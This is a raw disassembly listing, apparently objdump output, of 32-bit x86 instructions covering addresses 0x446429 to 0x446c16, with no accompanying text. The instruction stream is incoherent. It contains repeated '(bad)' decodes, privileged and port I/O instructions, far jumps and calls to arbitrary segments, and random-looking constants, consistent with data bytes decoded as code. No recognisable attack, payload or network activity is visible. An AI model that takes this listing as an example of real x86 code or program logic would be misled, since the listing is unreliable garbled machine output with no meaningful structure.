  446429:	in     al,0x2
  44642b:	ret    0x6682
  44642e:	or     eax,DWORD PTR [eax]
  446430:	outs   dx,BYTE PTR ds:[esi]
  446431:	dec    ebx
  446432:	inc    esi
  446433:	les    eax,FWORD PTR [ecx+0x30]
  446436:	push   ebx
  446437:	xchg   ebp,eax
  446438:	cmp    BYTE PTR [eax-0x36717d10],dh
  44643e:	pop    esi
  44643f:	pop    esp
  446440:	mov    eax,ds:0x5915650e
  446445:	xchg   esp,eax
  446446:	jae    0x446434
  446448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446449:	jle    0x446493
  44644b:	fimul  DWORD PTR [edx]
  44644d:	cld    
  44644e:	cwde   
  44644f:	lds    edi,FWORD PTR cs:[ecx-0x2e]
  446453:	mov    dh,ch
  446455:	xor    eax,0x5200d708
  44645a:	dec    esp
  44645b:	jle    0x4464c5
  44645d:	jle    0x446477
  44645f:	(bad)  
  446460:	sub    eax,0x867af610
  446465:	call   0x81a:0xf68ac
  44646c:	and    ebx,DWORD PTR [ebp+eiz*8+0x22]
  446470:	div    DWORD PTR [ebp+0x7400a047]
  446476:	jno    0x4464f2
  446478:	xor    bh,BYTE PTR [ecx+eax*1-0x45]
  44647c:	xchg   BYTE PTR [edx+eiz*4+0x2846e8a6],dh
  446483:	xlat   BYTE PTR ds:[ebx]
  446484:	mov    dh,0xf3
  446486:	retf   0x6b5b
  446489:	push   ebp
  44648a:	inc    edi
  44648b:	ins    DWORD PTR es:[edi],dx
  44648c:	pushf  
  44648d:	into   
  44648e:	lock ss call 0xebd6:0xd002b804
  446497:	enter  0xdbaa,0x6d
  44649b:	jo     0x44649c
  44649d:	jbe    0x4464ff
  44649f:	jae    0x4464fb
  4464a1:	in     eax,dx
  4464a2:	test   al,0xbd
  4464a4:	push   edx
  4464a5:	out    dx,eax
  4464a6:	ret    0x460a
  4464a9:	mov    bl,0x52
  4464ab:	xor    eax,0xea944ba0
  4464b0:	push   esp
  4464b1:	xor    DWORD PTR [ebp+0x1a41ed5d],eax
  4464b7:	and    eax,0xc62c04be
  4464bc:	lock test eax,0x20a3c248
  4464c2:	xchg   ah,cl
  4464c4:	sbb    DWORD PTR [esi+0x3e7d7696],0x352abc71
  4464ce:	push   DWORD PTR [ebp+0x385d484a]
  4464d4:	push   cs
  4464d5:	inc    edx
  4464d6:	call   0x5b9b5a51
  4464db:	icebp  
  4464dc:	inc    esp
  4464dd:	pushf  
  4464de:	ss xchg DWORD PTR fs:[edi+0x6b6bd922],ebx
  4464e6:	in     eax,dx
  4464e7:	adc    BYTE PTR [edx],0xeb
  4464ea:	call   0xe7cf:0x88652812
  4464f1:	push   ss
  4464f2:	int    0xaa
  4464f4:	das    
  4464f5:	lock imul ecx,DWORD PTR [eax-0x14],0x62
  4464fa:	push   eax
  4464fb:	xor    al,0x11
  4464fd:	test   al,0xd7
  4464ff:	add    al,0x62
  446501:	cwde   
  446502:	imul   edx,DWORD PTR [edx-0x3cb9bc56],0xffffff8a
  446509:	sahf   
  44650a:	rcr    DWORD PTR [esi-0x7bfa2b3],cl
  446510:	or     BYTE PTR [eax],al
  446512:	pop    ds
  446513:	pop    ebp
  446514:	push   ds
  446515:	in     al,0x97
  446517:	add    BYTE PTR [edx+0x4ad87804],cl
  44651d:	or     BYTE PTR [ecx+0x4b80a7e9],dl
  446523:	ins    BYTE PTR es:[edi],dx
  446524:	jmp    0x5158f989
  446529:	clc    
  44652a:	and    al,0x6a
  44652c:	xor    dl,BYTE PTR [ebp+0x48]
  44652f:	and    al,0xa4
  446531:	mov    eax,ds:0x447e3207
  446536:	add    al,0x6
  446538:	stos   BYTE PTR es:[edi],al
  446539:	cmp    eax,0xe148bfa5
  44653e:	mov    ds:0xee78f926,eax
  446543:	test   eax,0x4571dae9
  446548:	or     bl,BYTE PTR [eax-0xd4af986]
  44654e:	test   ch,cl
  446550:	push   ds
  446551:	sbb    al,dh
  446553:	mov    ebx,0xdaca34c5
  446558:	hlt    
  446559:	or     BYTE PTR [edi-0x4b],0x90
  44655d:	stos   DWORD PTR es:[edi],eax
  44655e:	in     eax,0x4c
  446560:	dec    esi
  446561:	fimul  WORD PTR ds:0xbc44bed
  446567:	les    esp,FWORD PTR [esi]
  446569:	pop    ebp
  44656a:	retf   0xaa34
  44656d:	fsubr  QWORD PTR [eax-0x57]
  446570:	sub    BYTE PTR [ecx-0x4f43b57e],bl
  446576:	mov    ch,0xb9
  446578:	mov    WORD PTR [esp+esi*2+0x15],cs
  44657c:	add    dh,ch
  44657e:	sub    BYTE PTR [ecx],ah
  446580:	loope  0x4465b9
  446582:	or     eax,0x415fc17a
  446587:	ret    0xaed6
  44658a:	ins    BYTE PTR es:[edi],dx
  44658b:	scas   al,BYTE PTR es:[edi]
  44658c:	lods   al,BYTE PTR ds:[esi]
  44658d:	leave  
  44658e:	xor    al,0x98
  446590:	push   ebx
  446591:	js     0x446513
  446593:	and    DWORD PTR [eax],edi
  446595:	nop
  446596:	add    al,0x4a
  446598:	sbb    dl,BYTE PTR [edx]
  44659a:	retf   
  44659b:	xor    al,BYTE PTR [ebx+0x3a]
  44659e:	loop   0x446564
  4465a0:	and    eax,DWORD PTR [ecx]
  4465a2:	lds    eax,FWORD PTR [eax+eiz*8+0x71feba22]
  4465a9:	push   es
  4465aa:	hlt    
  4465ab:	(bad)  
  4465ad:	in     al,dx
  4465ae:	outs   dx,DWORD PTR ds:[esi]
  4465af:	and    dl,BYTE PTR [ebx]
  4465b1:	mov    ebp,DWORD PTR [edx+0x10]
  4465b4:	loopne 0x446612
  4465b6:	xchg   BYTE PTR [edx],ah
  4465b8:	adc    bl,BYTE PTR [edi]
  4465ba:	or     eax,0x40fb1060
  4465bf:	jbe    0x44660e
  4465c1:	sbb    edx,edx
  4465c3:	or     BYTE PTR [edi-0xa],0xe2
  4465c7:	or     al,0xd3
  4465c9:	jp     0x44660f
  4465cb:	mov    ebp,0xddacf086
  4465d0:	mov    esi,0x6cbddea2
  4465d5:	loope  0x4465da
  4465d7:	cli    
  4465d8:	ror    BYTE PTR [edx],cl
  4465da:	in     al,dx
  4465db:	rol    BYTE PTR [ecx+0x40b58038],1
  4465e1:	mov    WORD PTR [esi+edi*1-0x7171791f],es
  4465e8:	lods   eax,DWORD PTR ds:[esi]
  4465e9:	dec    edx
  4465ea:	add    BYTE PTR [eax],dh
  4465ec:	mov    ebp,0x2fd45e58
  4465f1:	push   ecx
  4465f2:	fcomp  st(4)
  4465f4:	jae    0x446633
  4465f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4465f7:	jnp    0x446606
  4465f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4465fa:	or     eax,0x94e2c2f6
  4465ff:	pushf  
  446600:	add    al,0x86
  446602:	in     eax,dx
  446603:	test   BYTE PTR [esi],dh
  446605:	pop    esi
  446606:	jmp    0x44663d
  446608:	into   
  446609:	push   0x803c647c
  44660e:	inc    ecx
  44660f:	test   BYTE PTR [ebx],al
  446611:	push   edi
  446612:	jmp    0x9b12:0x7b3422d1
  446619:	out    0x70,al
  44661b:	cs sahf 
  44661d:	jo     0x4465ff
  44661f:	mov    ss,WORD PTR [ebp+0x2d2f1a38]
  446625:	call   0xbcd69bf3
  44662a:	mov    al,0x56
  44662c:	pop    eax
  44662d:	xchg   esi,eax
  44662e:	adc    BYTE PTR [ebx],bh
  446630:	xchg   BYTE PTR [esi+0x1e040a0],cl
  446636:	add    dl,bh
  446638:	repnz pop ebx
  44663a:	dec    eax
  44663b:	jge    0x44668f
  44663d:	clc    
  44663e:	push   es
  44663f:	and    BYTE PTR [esi+0x9350c0a],ch
  446645:	dec    eax
  446646:	mov    ecx,0xa6345e60
  44664b:	mov    eax,0xa3456b6
  446650:	loope  0x44663a
  446652:	inc    ebp
  446653:	outs   dx,DWORD PTR ds:[esi]
  446654:	ds (bad) 
  446656:	cs gs xor eax,0x4e464450
  44665d:	push   ecx
  44665e:	test   dh,cl
  446660:	stos   BYTE PTR es:[edi],al
  446661:	nop
  446662:	jo     0x4466dc
  446664:	out    0xc6,eax
  446666:	je     0x4466c9
  446668:	jmp    0x44666f
  44666a:	jle    0x446636
  44666c:	push   esp
  44666d:	mov    ah,0xd8
  44666f:	retf   
  446670:	pop    edx
  446671:	loopne 0x4466a7
  446673:	mov    bh,BYTE PTR [esi-0x64]
  446676:	xor    DWORD PTR [ebx-0x25],edx
  446679:	and    DWORD PTR [esi],ebx
  44667b:	push   0xffffffbe
  44667d:	shl    BYTE PTR [eax],0xf8
  446680:	pop    eax
  446681:	lods   al,BYTE PTR ds:[esi]
  446682:	cmc    
  446683:	mov    DWORD PTR [edi-0x2e],ebx
  446686:	arpl   WORD PTR [eax+0x67262b38],dx
  44668c:	sbb    al,0x0
  44668e:	ds loopne 0x446612
  446691:	mov    BYTE PTR [edi-0x1906b10c],ah
  446697:	mov    BYTE PTR [esi+0x22b0dae1],ah
  44669d:	es retf 
  44669f:	and    al,BYTE PTR [esi+0x4aa502c0]
  4466a5:	js     0x446695
  4466a7:	in     al,dx
  4466a8:	fimul  WORD PTR [ebx-0x3bf8bc94]
  4466ae:	adc    esp,0x6c
  4466b1:	in     eax,dx
  4466b2:	cmp    dh,BYTE PTR [edx+edx*2-0x6a]
  4466b6:	add    BYTE PTR [ebx+0x10],0x68
  4466ba:	sub    cl,al
  4466bc:	xchg   esi,eax
  4466bd:	imul   ebp,ebx,0x26a9b668
  4466c3:	inc    eax
  4466c4:	pusha  
  4466c5:	inc    ebp
  4466c6:	dec    esp
  4466c7:	pop    eax
  4466c8:	loope  0x4466ba
  4466ca:	sbb    eax,0xcd187c76
  4466cf:	push   edx
  4466d0:	dec    ecx
  4466d1:	clc    
  4466d2:	xchg   BYTE PTR [eax+0x6e],dl
  4466d5:	inc    ecx
  4466d6:	std    
  4466d7:	add    BYTE PTR [esi],dh
  4466d9:	xor    al,ah
  4466db:	aaa    
  4466dc:	sahf   
  4466dd:	pop    ds
  4466de:	xchg   ebx,eax
  4466df:	das    
  4466e0:	push   ebx
  4466e1:	sbb    edi,DWORD PTR [esi]
  4466e3:	fsub   QWORD PTR [edx+0x38]
  4466e6:	out    dx,eax
  4466e7:	dec    ebp
  4466e8:	push   esi
  4466e9:	ds cmc 
  4466eb:	rol    esi,1
  4466ed:	pop    ecx
  4466ee:	add    ecx,DWORD PTR [edx+0x7ea63c8b]
  4466f4:	rcl    cl,1
  4466f6:	fimul  DWORD PTR [ebx+0x6511a4]
  4466fc:	adc    al,0xa
  4466fe:	sahf   
  4466ff:	fs cli 
  446701:	or     al,0x61
  446703:	cmc    
  446704:	mov    BYTE PTR [eax+0x8628c90],ch
  44670a:	sub    eax,0x587e1498
  44670f:	(bad)  
  446710:	int3   
  446711:	mov    bl,0xeb
  446713:	and    dl,BYTE PTR [ebp-0x4c9f9389]
  446719:	dec    edi
  44671a:	adc    BYTE PTR [esi+0x5604cac0],ah
  446720:	push   ss
  446721:	push   0xffffff95
  446723:	xor    al,0x2e
  446725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446726:	mov    ebx,0xf64071ae
  44672b:	es push ds
  44672d:	add    BYTE PTR [eax],ch
  44672f:	out    0xbf,al
  446731:	rcr    dl,cl
  446733:	cmc    
  446734:	jmp    0x4466c9
  446736:	test   DWORD PTR [edi-0x633a47d0],edx
  44673c:	mov    esp,0xac3abb55
  446741:	sub    ebx,DWORD PTR [edx-0x1fb96bfa]
  446747:	arpl   WORD PTR [eax],ax
  446749:	xor    esp,DWORD PTR [eax+eax*1]
  44674c:	int3   
  44674d:	loopne 0x44676a
  44674f:	mov    WORD PTR [eax+0x17],fs
  446752:	push   eax
  446753:	lds    esp,FWORD PTR [esi]
  446755:	push   edx
  446756:	mov    ah,0xce
  446758:	cli    
  446759:	scas   al,BYTE PTR es:[edi]
  44675a:	dec    edx
  44675b:	js     0x4467c5
  44675d:	dec    ebp
  44675e:	xchg   ebx,eax
  44675f:	sbb    ah,dh
  446761:	sbb    BYTE PTR [esp+edx*4],0x10
  446765:	(bad)  
  446766:	scas   al,BYTE PTR es:[edi]
  446767:	add    DWORD PTR [eax-0x55],esp
  44676a:	inc    eax
  44676b:	(bad)  
  44676c:	loop   0x44675e
  44676e:	in     eax,dx
  44676f:	fimul  DWORD PTR [ecx+0x4c8d494]
  446775:	add    eax,0x501e2015
  44677a:	sub    cl,BYTE PTR [edx]
  44677c:	push   0x55d1e838
  446781:	es jmp 0x16c8da22
  446787:	int3   
  446788:	test   eax,0x484215fe
  44678d:	out    0x4,al
  44678f:	inc    esp
  446790:	out    0x0,eax
  446792:	xchg   esp,eax
  446793:	sub    eax,0x64e00
  446798:	mov    eax,ds:0xe5f46522
  44679d:	pop    eax
  44679e:	shl    BYTE PTR [ecx+0x3c],1
  4467a1:	sub    dl,BYTE PTR [edx+0x3c3825d8]
  4467a7:	pop    es
  4467a8:	sub    al,0x6b
  4467aa:	adc    bl,BYTE PTR [eax]
  4467ac:	lock retf 0xb586
  4467b0:	rcl    DWORD PTR [esi],1
  4467b2:	pop    eax
  4467b3:	test   DWORD PTR [edx+0x1c00e2cc],eax
  4467b9:	sub    edx,DWORD PTR [esi-0x2527bfe2]
  4467bf:	jmp    DWORD PTR [esi+0x429a4c9b]
  4467c5:	in     al,dx
  4467c6:	mov    ebp,0x57e6a44a
  4467cb:	sub    BYTE PTR [ebx+edi*4-0x3f8cff97],0xab
  4467d3:	popa   
  4467d4:	rcl    DWORD PTR [ebx-0x3467aae4],1
  4467da:	fisub  WORD PTR [esp+eiz*2-0x64a5dc3e]
  4467e1:	add    BYTE PTR [edx+0x4df8cc93],0x51
  4467e8:	adc    BYTE PTR [esi],dl
  4467ea:	pop    esp
  4467eb:	cdq    
  4467ec:	retf   0xc29
  4467ef:	mov    ds:0xac81d7a1,eax
  4467f4:	xchg   edi,eax
  4467f5:	mov    al,ds:0xbbee7b37
  4467fa:	je     0x446847
  4467fc:	sbb    BYTE PTR [eax],bh
  4467fe:	push   0xffffffd2
  446800:	leave  
  446801:	(bad)  
  446802:	sub    cl,BYTE PTR [edx-0x71]
  446805:	dec    esp
  446806:	mov    ah,0xfe
  446808:	sbb    al,0x91
  44680a:	nop
  44680b:	out    dx,eax
  44680c:	iret   
  44680d:	lock ret 
  44680f:	ret    0xde0b
  446812:	mov    gs,WORD PTR ds:[esi+0xa]
  446816:	enter  0x487a,0xe9
  44681a:	add    eax,0x6c7b5a30
  44681f:	(bad)  
  446820:	dec    esi
  446821:	mov    ah,0xad
  446823:	pop    edx
  446824:	dec    eax
  446825:	and    ecx,esp
  446827:	neg    DWORD PTR [ecx+0x6a8dfa0d]
  44682d:	rol    DWORD PTR [ebp-0x47bbfdf8],cl
  446833:	cld    
  446834:	mov    dh,0x17
  446836:	pop    edx
  446837:	lock or al,0xe6
  44683a:	adc    edi,esp
  44683c:	lahf   
  44683d:	sub    al,0x1c
  44683f:	lahf   
  446840:	push   0x94686a6b
  446845:	rol    edx,1
  446847:	push   eax
  446848:	mov    eax,0x77d628e6
  44684d:	mov    ch,BYTE PTR [ecx]
  44684f:	sti    
  446850:	or     BYTE PTR [edx],dh
  446852:	in     eax,dx
  446853:	adc    eax,0x131c24c
  446858:	je     0x4467f3
  44685a:	add    ecx,edx
  44685c:	mov    esi,?
  44685e:	frstor [esi+0x5b0411ec]
  446865:	arpl   sp,bx
  446867:	jle    0x446849
  446869:	inc    ebx
  44686a:	(bad)  
  44686b:	dec    ebx
  44686c:	inc    eax
  44686d:	lods   al,BYTE PTR ds:[esi]
  44686e:	fisubr DWORD PTR [edi-0x12e4dde5]
  446874:	call   0x68892712
  446879:	add    BYTE PTR [ecx+0x4ab0706f],al
  44687f:	push   esi
  446880:	adc    BYTE PTR [eax],al
  446882:	fild   WORD PTR [ecx-0xa]
  446885:	add    eax,0xe670786c
  44688a:	cwde   
  44688b:	add    al,BYTE PTR [esi]
  44688d:	mov    esi,0xe1b0765a
  446892:	adc    edx,esp
  446894:	sbb    ecx,ecx
  446896:	dec    esp
  446897:	and    eax,0xaa43dc5c
  44689c:	pop    edx
  44689d:	mov    ebx,0x52a5bea0
  4468a2:	xchg   ebx,eax
  4468a3:	mov    BYTE PTR [ecx-0x787f166a],ch
  4468a9:	xchg   edx,eax
  4468aa:	push   ds
  4468ab:	xor    dh,BYTE PTR [eax-0x3ccde390]
  4468b1:	and    esp,eax
  4468b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4468b4:	fsubr  st,st(3)
  4468b6:	shr    al,0xbf
  4468b9:	cvttps2pi mm0,xmm7
  4468bc:	push   es
  4468bd:	mov    al,0x35
  4468bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4468c0:	dec    edi
  4468c1:	jbe    0x4468de
  4468c3:	pop    esp
  4468c4:	push   edx
  4468c5:	shl    DWORD PTR [eax],0x24
  4468c8:	js     0x446857
  4468ca:	adc    al,0xaa
  4468cc:	inc    ebx
  4468cd:	mov    ah,0x24
  4468cf:	icebp  
  4468d0:	inc    eax
  4468d1:	shl    BYTE PTR [esi+0x346caf6],0xfe
  4468d8:	sbb    ecx,0x6b
  4468db:	xor    DWORD PTR [eax-0xc610fdd],esp
  4468e1:	cmp    al,0xf3
  4468e3:	jbe    0x4468df
  4468e5:	gs (bad) 
  4468e8:	fsub   DWORD PTR [eax-0x26ff937e]
  4468ee:	sub    eax,0x4082f102
  4468f3:	jmp    0xa5f8:0x8a282574
  4468fa:	dec    edi
  4468fb:	into   
  4468fc:	xor    al,0xce
  4468fe:	into   
  4468ff:	sub    eax,0x8d52716
  446904:	cmp    eax,0x1916bc7e
  446909:	or     al,0x6c
  44690b:	jge    0x44691f
  44690d:	fld    TBYTE PTR [ebx-0x72]
  446910:	add    eax,0x8ccdb2d7
  446915:	lods   eax,DWORD PTR ds:[esi]
  446916:	enter  0x3cd1,0xfd
  44691a:	int3   
  44691b:	fisub  DWORD PTR [edx+0x15b34c2e]
  446921:	and    ah,ch
  446923:	test   DWORD PTR [edx+0x26f4611b],esp
  446929:	sbb    DWORD PTR [ebx],edi
  44692b:	xchg   edx,eax
  44692c:	hlt    
  44692d:	push   ebx
  44692e:	mov    esi,0x9126e003
  446933:	push   0x3b
  446935:	sub    bl,BYTE PTR [edx+0x729d5a63]
  44693b:	cs jl  0x4468d8
  44693e:	adc    BYTE PTR [eax+0x37],bh
  446941:	pop    es
  446942:	mov    ds,WORD PTR [edi]
  446944:	sbb    bl,BYTE PTR [ebp+0x2]
  446947:	gs sbb cl,dh
  44694a:	fild   WORD PTR [eax]
  44694c:	(bad)  
  44694d:	cmp    al,0xd6
  44694f:	xchg   edx,eax
  446950:	add    dl,bl
  446952:	inc    esi
  446953:	mul    DWORD PTR [eax-0x7d52f82]
  446959:	lods   eax,DWORD PTR gs:[esi]
  44695b:	push   ss
  44695c:	out    0xca,eax
  44695e:	jle    0x44691b
  446960:	jg     0x446916
  446962:	mov    DWORD PTR [ecx+edi*1+0x76464b5e],esi
  446969:	(bad)  
  44696a:	jle    0x4469d0
  44696c:	dec    esi
  44696d:	push   cs
  44696e:	das    
  44696f:	sub    eax,0x1e2ab7e1
  446974:	xchg   esp,ebx
  446976:	clc    
  446977:	dec    ebx
  446978:	adc    BYTE PTR [esi-0x77f7fed5],dh
  44697e:	or     cl,0xba
  446981:	push   eax
  446982:	mov    dl,0xed
  446984:	dec    ebx
  446985:	push   edx
  446986:	or     eax,0x3ac202ac
  44698b:	fdiv   st,st(6)
  44698d:	dec    esp
  44698e:	xor    eax,0x92824294
  446993:	mov    al,ds:0x9f22253f
  446998:	nop
  446999:	mov    al,0x35
  44699b:	loopne 0x446951
  44699d:	push   ss
  44699e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44699f:	iret   
  4469a0:	and    al,0x97
  4469a2:	fwait
  4469a3:	adc    eax,0x441b243
  4469a8:	and    ah,BYTE PTR [edi-0x3c]
  4469ab:	cs (bad) 
  4469ad:	js     0x4469c4
  4469af:	adc    esi,0x124c6e
  4469b5:	xor    BYTE PTR [esi-0x59],0x88
  4469b9:	pop    ebp
  4469ba:	dec    esp
  4469bb:	test   DWORD PTR [ecx],eax
  4469bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4469be:	sub    DWORD PTR [edx],ebx
  4469c0:	xchg   esp,eax
  4469c1:	and    bl,BYTE PTR [edx]
  4469c3:	mov    DWORD PTR [esi],ecx
  4469c5:	and    al,0x7b
  4469c7:	or     ecx,DWORD PTR ss:[edx+0x2]
  4469cb:	pop    ebp
  4469cc:	inc    edi
  4469cd:	repnz retf 0xfb4a
  4469d1:	push   es
  4469d2:	or     eax,0x4c50268e
  4469d7:	fsubr  QWORD PTR [esi+0x541014a]
  4469dd:	and    bl,BYTE PTR [edx]
  4469df:	mov    edx,0x7a095e18
  4469e4:	and    al,0xa3
  4469e6:	repnz or eax,0x4c365be
  4469ec:	mov    cl,BYTE PTR [ecx]
  4469ee:	sbb    al,0x36
  4469f0:	mov    ecx,0x2d563edc
  4469f5:	call   0xc318288a
  4469fa:	fld    TBYTE PTR [esi]
  4469fc:	mov    cl,0xda
  4469fe:	daa    
  4469ff:	test   al,0xac
  446a01:	or     al,BYTE PTR ds:0xf1a8a222
  446a07:	add    eax,edx
  446a09:	push   es
  446a0a:	inc    esp
  446a0b:	mov    edi,0xfd170d5
  446a10:	icebp  
  446a11:	add    dl,ch
  446a13:	pop    es
  446a14:	pusha  
  446a15:	imul   edi,esi,0xffffffb6
  446a18:	mov    eax,0xa4a4d4a6
  446a1d:	adc    dl,dh
  446a1f:	xchg   esp,eax
  446a20:	jle    0x446a72
  446a22:	fisub  DWORD PTR [ecx-0x7bc3c946]
  446a28:	cwde   
  446a29:	add    eax,0x14455057
  446a2e:	mov    BYTE PTR [eax],bh
  446a30:	or     al,0xf6
  446a32:	push   ds
  446a33:	aam    0xf8
  446a35:	and    al,0xfc
  446a37:	mov    dl,0x6a
  446a39:	sub    DWORD PTR [esi+ecx*1-0x26],ecx
  446a3d:	outs   dx,BYTE PTR ds:[esi]
  446a3e:	mov    al,BYTE PTR [edi]
  446a40:	dec    eax
  446a41:	push   0x9c04528c
  446a46:	push   ss
  446a47:	rcr    edx,1
  446a49:	add    BYTE PTR [esi-0x2d9ecd63],0x18
  446a50:	add    DWORD PTR [edx+0x133fbe23],eax
  446a56:	add    DWORD PTR [esp+esi*1+0x40],edi
  446a5a:	jecxz  0x446a8b
  446a5c:	push   ds
  446a5d:	xor    bl,bh
  446a5f:	or     eax,0x601c68e3
  446a64:	adc    eax,0x882e4c5c
  446a69:	lahf   
  446a6a:	mov    al,ds:0xf908b220
  446a6f:	retf   
  446a70:	inc    ebx
  446a71:	adc    ebx,ebx
  446a73:	mov    ch,0x4c
  446a75:	pop    eax
  446a76:	inc    esi
  446a77:	repz add DWORD PTR [edx],esp
  446a7a:	xchg   edi,eax
  446a7b:	mov    BYTE PTR [esi+0x7f8c0cae],al
  446a81:	mov    WORD PTR [edi-0x4ac92ef8],gs
  446a87:	push   es
  446a88:	loopne 0x446a9c
  446a8a:	cli    
  446a8b:	pop    ecx
  446a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446a8d:	ja     0x446af5
  446a8f:	pop    eax
  446a90:	or     ecx,DWORD PTR [ecx]
  446a92:	ins    DWORD PTR es:[edi],dx
  446a93:	shl    DWORD PTR [ebx],0xea
  446a96:	jne    0x446b16
  446a98:	push   0x7a
  446a9a:	pop    eax
  446a9b:	and    eax,0x6fdac2aa
  446aa0:	mov    ah,cl
  446aa2:	jecxz  0x446a62
  446aa4:	sub    eax,0x5db41cee
  446aa9:	add    eax,DWORD PTR [ebx+esi*4-0x22]
  446aad:	jle    0x446a97
  446aaf:	xor    eax,0x7b5a22f6
  446ab4:	xchg   esi,eax
  446ab5:	mov    ah,0x3a
  446ab7:	fcomp  QWORD PTR [edi]
  446ab9:	dec    edx
  446aba:	std    
  446abb:	fdiv   QWORD PTR [eax]
  446abd:	xor    al,0xa8
  446abf:	or     eax,0xfa20c40b
  446ac4:	jmp    0x2c7:0x473efb2f
  446acb:	ds pop ebx
  446acd:	dec    esi
  446ace:	add    edi,DWORD PTR [eax-0x2]
  446ad1:	add    DWORD PTR [ecx-0x2b],ebp
  446ad4:	xchg   DWORD PTR [ebp+0x78ab1a19],eax
  446ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446adb:	inc    eax
  446adc:	xor    al,0x9a
  446ade:	fiadd  DWORD PTR [ebx]
  446ae0:	scas   al,BYTE PTR es:[edi]
  446ae1:	jle    0x446b04
  446ae3:	sub    bl,BYTE PTR fs:[eax+edi*1]
  446ae7:	jno    0x446b15
  446ae9:	imul   edi,DWORD PTR [ebx],0xa922b4de
  446aef:	add    DWORD PTR [esi],esi
  446af1:	lahf   
  446af2:	or     ch,BYTE PTR [eax-0x80]
  446af5:	shl    BYTE PTR [esp+ebx*4+0x3d05d65e],1
  446afc:	inc    eax
  446afd:	les    esp,FWORD PTR [edx+0x5a]
  446b00:	fistp  DWORD PTR [esi]
  446b02:	fcomp  DWORD PTR [eax-0xc]
  446b05:	pusha  
  446b06:	rcl    ah,1
  446b08:	fsubr  st,st(3)
  446b0a:	add    BYTE PTR [edi],dh
  446b0c:	mov    al,0xa9
  446b0e:	push   ebp
  446b0f:	pop    es
  446b10:	mov    ds:0x8354da7a,al
  446b15:	inc    ebx
  446b16:	ror    BYTE PTR [ebx+0x2],1
  446b19:	lahf   
  446b1a:	pop    esi
  446b1b:	push   ds
  446b1c:	sub    ebp,DWORD PTR [edx]
  446b1e:	mov    edx,0x6d2c0f36
  446b23:	pop    edi
  446b24:	adc    cl,BYTE PTR [edx]
  446b26:	out    dx,al
  446b27:	mov    esi,0x893a3a20
  446b2c:	push   eax
  446b2d:	jno    0x446b57
  446b2f:	adc    BYTE PTR [edx-0x2f40e3d2],dl
  446b35:	and    DWORD PTR [edx+0x711cb699],ebp
  446b3b:	push   0xfa8154f0
  446b40:	xor    al,0x64
  446b42:	inc    eax
  446b43:	dec    esi
  446b44:	imul   edx,DWORD PTR [edi-0x2e],0x76
  446b48:	imul   ecx,DWORD PTR [esi+esi*4+0x76],0x579c55b7
  446b50:	push   0xfdacb3e0
  446b55:	rcr    BYTE PTR [ebp+esi*1-0x7e],0x14
  446b5a:	and    al,0xbe
  446b5c:	(bad)  
  446b5d:	iret   
  446b5e:	or     al,0xd3
  446b60:	push   es
  446b61:	imul   eax,DWORD PTR [ebp-0x3a],0xffffffe8
  446b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446b66:	out    dx,eax
  446b67:	adc    BYTE PTR fs:[esi+ebx*1-0x783aa4c6],0xa5
  446b70:	fsub   QWORD PTR [esi-0x36]
  446b73:	inc    esi
  446b74:	xchg   esp,eax
  446b75:	push   ss
  446b76:	aas    
  446b77:	add    BYTE PTR [esi],dh
  446b79:	jl     0x446b86
  446b7b:	out    dx,al
  446b7c:	mov    esp,0x9eeab2f2
  446b81:	add    ah,ch
  446b83:	cmp    BYTE PTR [edx-0x3],bh
  446b86:	in     al,0x81
  446b88:	scas   eax,DWORD PTR es:[edi]
  446b89:	push   edx
  446b8a:	in     eax,dx
  446b8b:	rcr    BYTE PTR [ecx],0xc6
  446b8e:	(bad)  
  446b8f:	jbe    0x446b41
  446b91:	cli    
  446b92:	leave  
  446b93:	xchg   esi,eax
  446b94:	clc    
  446b95:	dec    ebp
  446b96:	nop
  446b97:	ficom  DWORD PTR [ecx]
  446b99:	and    al,0x58
  446b9b:	or     DWORD PTR [edx],ebx
  446b9d:	mov    edi,0xa47d2d2
  446ba2:	mov    ah,0x5b
  446ba4:	stos   BYTE PTR es:[edi],al
  446ba5:	add    edx,ecx
  446ba7:	gs jecxz 0x446b2e
  446baa:	cmp    esi,edi
  446bac:	(bad)  
  446bad:	es xor al,0x40
  446bb0:	pop    ss
  446bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446bb2:	xchg   esi,eax
  446bb3:	dec    edx
  446bb4:	inc    eax
  446bb5:	loopne 0x446b37
  446bb7:	test   al,0x30
  446bb9:	(bad)  
  446bba:	xlat   BYTE PTR ds:[ebx]
  446bbb:	shl    BYTE PTR [eax-0x5292ba05],cl
  446bc1:	push   esp
  446bc2:	adc    al,0x82
  446bc4:	mov    edx,0x7641190a
  446bc9:	add    DWORD PTR [ebx],esi
  446bcb:	cs push eax
  446bcd:	push   ebx
  446bce:	xchg   ebp,eax
  446bcf:	sub    BYTE PTR [eax-0x4bab8907],bl
  446bd5:	aad    0x2
  446bd7:	push   cs
  446bd8:	pusha  
  446bd9:	rcl    BYTE PTR ds:0x2f648ebe,cl
  446bdf:	dec    ebx
  446be0:	pop    ds
  446be1:	dec    ebp
  446be2:	jbe    0x446bf6
  446be4:	(bad)  
  446be5:	(bad)  
  446be6:	lahf   
  446be7:	xor    al,0x3a
  446be9:	mov    cl,cl
  446beb:	sbb    BYTE PTR [ebp-0x80],cl
  446bee:	rcr    BYTE PTR [edi],0xa9
  446bf1:	add    eax,0x54529a4d
  446bf6:	aad    0x95
  446bf8:	add    bl,BYTE PTR [ecx-0x13]
  446bfb:	adc    BYTE PTR [esi],bh
  446bfd:	push   ecx
  446bfe:	push   0x6a
  446c00:	dec    eax
  446c01:	push   ds
  446c02:	pusha  
  446c03:	loop   0x446c31
  446c05:	ret    0x9f0
  446c08:	mov    fs:0xfc2d086f,eax
  446c0e:	add    dl,BYTE PTR [eax-0x10]
  446c11:	stos   DWORD PTR es:[edi],eax
  446c12:	dec    edx
  446c13:	inc    edi
  446c14:	or     al,dh
  446c16:	add    BYTE PTR [eax+0x7b],al
